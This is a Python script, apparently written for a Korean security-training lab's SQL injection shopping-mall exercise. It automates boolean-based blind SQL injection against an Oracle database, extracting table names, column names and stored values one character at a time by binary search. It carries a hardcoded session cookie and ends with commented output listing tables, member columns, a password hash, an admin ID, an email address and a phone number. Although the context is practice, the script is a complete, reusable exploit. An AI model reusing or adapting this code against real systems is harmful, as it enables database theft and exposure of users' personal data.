import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # 인증서 없을 때 오류 안보이게 함

url = "https://lab.eqst.co.kr:8110/practice/practice01/detail?id=61 and "
h = {"Host":"lab.eqst.co.kr:8110"}
c = {"JSESSIONID":"F6D732CB8BD23F4C24AC0751A339EC92"}

def isBig(query):
    # 127보다 크다면
    end = 127
    while(1):
        q = f"{query} > {end}"
        urls = url + q
        res = requests.get(urls, cookies=c, verify=False) # verify: SSL 에러 때문에 
        # print(res.text)
        if  "애플" in res.text:
            ## 크다(0)
            end*=10
            # print(end)
        else:
            ## 작다(^_^)
            return end

def binFunc(query, end):
    start = 1
    while start < end:
        mid = int((start + end) / 2)
        
        q = f"({query}) > {mid}"
        urls = url + q
        res = requests.get(urls, cookies=c, verify=False) # verify: SSL 에러 때문에 
        
        if  "애플" in res.text:
            start = mid + 1
        else:
            end = mid
    return start

def queryString(selects, froms, wheres):
    if wheres == "":
        return f"select {selects} from {froms}"
    else:
        return f"select {selects} from {froms} where {wheres}"

# ("column_name", "cols", i, f"table_name={tbl}")
# length -> data
def forRepeat(name, names, ii, con):
    subq = f"(select rownum as rn, {name} from {names} {con})"
    rn = f"rn={str(ii)}"
    quer1 = queryString(f"length({name})", subq, rn) # 길이 구하기
    # print(quer1)
    # print(q2)
    len = binFunc(quer1,isBig(quer1))
    # print(f"{ii}번 길이: {len}")
    namestr=""
    for j in range(1,(int(len)+1)):
        quer2 = queryString(f"ascii(substr({name},{j},1))", subq, rn) # 이름 구하기
        # print(quer2)
        namestr += chr(binFunc(quer2,isBig(quer2)))
    # print(f"{ii} : {namestr}")
    return namestr

# ==================================
# * SQL Injection 쇼핑몰 문제 1번
# ===================================
data = {}
# 1.Table명
#쿼리: select table_name from user_tables
# 1-1. select count(table_name) from user_tables
def findTable():
    q1 = queryString("count(table_name)", "user_tables", "")
    # "select count(table_name) from user_tables"
    tblcnt = binFunc(q1, isBig(q1))
    # print(f"테이블 개수: {tblcnt}") # 테이블 길이

    # 1-2. 테이블 별 길이 및 이름 구하기
    # 쿼리문: select tbl from (select rownum as rn, table_name from user_tables) where rn=1
    tables = []
    
    for i in range(1,int(tblcnt)+1):
        tbl = forRepeat("table_name", "user_tables", i, "")
        tables.append(tbl)
        # tables.append(forRepeat("table_name", "user_tables", i, ""))
        print(f"{i}> {tbl}")
    return tables


# 2.ANSWER 테이블의 컬럼명
# 2-1. 컬럼 개수 찾기
# wanaTbl = input(f"원하는 테이블 번호 입력: ")
# wanaTbl = "MEMBER"
def cols(wanaTbl):
    # print("="*10+"COLUMNS"+"="*10)
    q3 = queryString("count(column_name)", "cols", f"table_name='{wanaTbl}'")
    colcnt = binFunc(q3, isBig(q3))
    # print(f"{wanaTbl} 컬럼 개수: {colcnt}") # 테이블 길이

    # 컬럼 길이 / 컬럼 명 찾기
    columns = []
    for i in range(1,int(colcnt)+1):
        col = forRepeat("column_name", "cols", i, f"where table_name='{wanaTbl}'")
        columns.append(col)
        print(f"{i}> {col}")
    return columns


# 3. 컬럼 별 각 값 찾기 -> EMAIL, PHONE
# 쿼리: select memberid from id(tbl[i])
# select answer from (select answer, rownum as rn from answer) where rn=1
def findValue(col,wantTbl):
    values = []
    cntQuery = queryString(f"count({col})",f"{wantTbl}","")
    cntVal = binFunc(cntQuery, isBig(f"({cntQuery})"))
    # print(f"데이터 개수: {cntVal}") 

    # 추출된 데이터를 기반으로 1열의 전화번호와 이메일을 자동으로 추출
    lenQuery = queryString(f"length({col})",f"(select {col}, rownum as rn from {wantTbl})","rn=1")
    # print(lenQuery)
    val = forRepeat(f"{col}", f"{wantTbl}", 1,"")
    values.append
    print(val)
    return values

# for i in range(1,10):
#     # 데이터 개수 찾기
#     cntValues = queryString("count(rn)",f"(select {columns[i]}, rownum as rn from {wanaTbl})","")
#     print(f"데이터 개수: {cntValues}")
#     val = forRepeat(columns[i], wanaTbl, i)
#     print(f"{columns[i]} -> {val}")
    # select length(answer) from (select answer, rownum as rn from answer) where rn=1
    # select ascii(substr(answer,1,1)) from (select answer, rownum as rn from answer) where rn=1

# 테이블 찾기
print("="*10+"TABLE INFO"+"="*10)
tbls = findTable()
wantTble = int(input(f"원하는 테이블 번호 입력: "))
# ==========TABLE INFO==========
# 1> BAG
# 2> MEMBER
# 3> MEMBER_ROLE
# 4> NOTICE
# 5> PRODUCT
# 6> PRODUCTIMG
# 7> QNA
# 8> ROLE
# 9> ORDERLIST
# 10> COUPONLIST
# 11> COUPON
# 12> ACCESS_LOG

# 컬럼 찾기
print("="*10+f"{tbls[wantTble-1]} COLUMNS INFO"+"="*10)
cols = cols(tbls[wantTble-1])
# ==========MEMBER COLUMNS INFO==========
# 1> ID
# 2> PASSWORD
# 3> MEMBERID
# 4> ENABLED
# 5> NAME
# 6> EMAIL
# 7> PHONE
# 8> PWQ
# 9> PWA
# 10> POINT


print("종료하려면 q를 눌러주세요...")
while(1):
    wantCol = int(input(f"원하는 컬럼 번호 입력: "))
    print("="*10+f"{cols[wantCol-1]}"+"="*10)

    # 데이터 찾기
    vals = findValue(cols[wantCol-1], tbls[wantTble-1])
    # vals = findValue(wantCol, cols[wantCol-1])


# --- 원하는 고객 정보 ---
# ==========PASSWORD==========
# $2a$10$/Aevf/dAVPcQcUBEfryjw.f86tUcNiwGldmdGMCyK.2Pyojf5rwjG
# 원하는 컬럼 번호 입력: 3
# ==========MEMBERID==========
#  admin
# ==========EMAIL==========
# kim_sy@sk.com
# 원하는 컬럼 번호 입력: 7
# ==========PHONE==========
# 01026204060